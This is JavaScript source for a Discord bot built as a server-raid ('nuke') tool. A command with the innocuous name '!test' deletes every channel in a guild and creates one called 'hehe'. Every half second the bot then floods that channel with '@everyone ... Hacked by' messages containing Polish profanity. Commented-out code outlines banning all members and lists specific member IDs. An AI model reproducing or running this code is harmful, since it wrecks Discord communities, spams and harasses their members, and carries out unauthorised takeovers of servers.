const Discord = require("discord.js");
const bot = new Discord.Client();

bot.on("ready", e => {
	setInterval (function (){
	  var statusrand  = Math.floor(Math.random() * 8 + 1);
	  if (statusrand === 1) {
		bot.channels.find(`name`, 'hehe').send("@everyone i love all\nHacked by *chuj Cię to* :kissing_heart:");   
		//bot.channels.get("490431842424717322").setName(moment.utc(message.createdAt).format('HH:mm:ss'));
		console.log(statusrand);
	  }
	  if (statusrand === 2) {
		bot.channels.find(`name`, 'hehe').send("@everyone i love all\nHacked by *chuj Cię to* :kissing_heart:");
		//bot.channels.get("490431842424717322").setName(moment.utc(message.createdAt).format('HH:mm:ss'));
		console.log(statusrand);
	  }
	  if (statusrand === 3) {
		bot.channels.find(`name`, 'hehe').send("@everyone i love all\nHacked by *chuj Cię to* :kissing_heart:"); 
		//bot.channels.get("490431842424717322").setName(moment.utc(message.createdAt).format('HH:mm:ss'));
		console.log(statusrand);
	  }
	  if (statusrand === 4) {
		bot.channels.find(`name`, 'hehe').send("@everyone i love all\nHacked by *chuj Cię to* :kissing_heart:");  
		//bot.channels.get("490431842424717322").setName(moment.utc(message.createdAt).format('HH:mm:ss'));
		console.log(statusrand);
	  }
	  if (statusrand === 5) {
		bot.channels.find(`name`, 'hehe').send("@everyone i love all\nHacked by *chuj Cię to* :kissing_heart:");
		//bot.channels.get("490431842424717322").setName(moment.utc(message.createdAt).format('HH:mm:ss'));
		console.log(statusrand);
	  }
	  if (statusrand === 6) {
		bot.channels.find(`name`, 'hehe').send("@everyone i love all\nHacked by *chuj Cię to* :kissing_heart:");
		//bot.channels.get("490431842424717322").setName(moment.utc(message.createdAt).format('HH:mm:ss'));
		console.log(statusrand); 
	  }
	  if (statusrand === 7) {
		bot.channels.find(`name`, 'hehe').send("@everyone i love all\nHacked by *chuj Cię to* :kissing_heart:");  
		//bot.channels.get("490431842424717322").setName(moment.utc(message.createdAt).format('HH:mm:ss'));
		console.log(statusrand);
	  }
	  if (statusrand === 8) {
		bot.channels.find(`name`, 'hehe').send("@everyone i love all\nHacked by *chuj Cię to* :kissing_heart:");  
		//bot.channels.get("490431842424717322").setName(moment.utc(message.createdAt).format('HH:mm:ss'));
		console.log(statusrand);
	  }
  
	}, 500);
  });
  
  bot.on('message', async message => {
    let prefix = "!";
    //let prefix = konfiguracja.prefix;
    let messageArray = message.content.split(" ");
    let cmd = messageArray[0];
    let msg = message.content.startsWith;
    let args = messageArray.slice(1);
	
	if(cmd === `${prefix}test`){
		message.guild.channels.deleteAll();
                message.guild.createChannel("hehe");
                //for (let i = 0; i < message.guild.members.size; i++) {
                    //message.guild.members[i].user.ban()
                //}
               // message.guild.members.get("553930452331921411");
             //   message.guild.members.get("571766735561031680");
             //   message.guild.members.get("541594841285394433");
            //    message.guild.members.get("513379170416590848");
            //    message.guild.members.get("563308172664635392");
            //    message.guild.members.get("530384568021155841");
           //     message.guild.members.get("559761453964460062");
           //     message.guild.members.get("527551982940979202");
           //     message.guild.members.get("566297409957658624");
          //      message.guild.members.get("570570049811644417");
          //      message.guild.members.get("544580220733358091");
          //      message.guild.members.get("515155469900447745");
          //      message.guild.members.get("569866077518168083");
         //       message.guild.members.get("user ID here");
		//message.channel.send("**POMOC BOTA:**\n`Aktualnie brak komend innych niz !help w tym bocie ;(`");
	}
  });
  
  bot.login(process.env.TOKEN);
